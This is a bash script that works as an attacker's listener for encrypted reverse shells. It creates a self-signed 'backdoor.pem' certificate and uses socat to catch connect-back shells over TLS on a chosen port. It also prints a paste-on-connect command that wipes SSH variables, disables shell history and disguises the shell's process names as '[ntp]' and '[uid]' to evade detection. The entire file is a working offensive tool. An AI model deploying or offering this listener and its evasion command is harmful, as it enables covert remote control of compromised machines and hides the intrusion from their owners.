#!/usr/bin/env bash

which socat &>/dev/null || (echo "Please install socat!";exit 1)
which openssl &>/dev/null || (echo "Please install openssl!";exit 1)

[[ -z "$1" ]] && echo "Please provide a port to listen to!" && exit 1

openssl req -newkey rsa:2048 -nodes -keyout tmp.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out tmp.crt &>/dev/null || (echo "Failed to create backdoor SSL certificate!";exit 1)
cat tmp.key tmp.crt >./backdoor.pem 2>/dev/null || (echo "Failed to write backdoor PEM file!";exit 1)
rm tmp.key tmp.crt

echo "Paste this on connect back: unset SSH_CLIENT SSH_CONNECTION; SHELL=/bin/bash TERM=xterm-256color BASH_HISTORY=/dev/null HISTFILE=/dev/null exec -a [ntp] script -qc 'exec -a [uid] /bin/bash -i' /dev/null"
echo "If you want to close this listener, do a 'killall socat'"

ttyp=$(stty -g)
stty raw -echo opost

echo "Listening on port $1 ..."
socat -d -d OPENSSL-LISTEN:$1,cert=./backdoor.pem,verify=0,fork STDOUT 2>/dev/null

stty "${ttyp}"

rm ./backdoor.pem
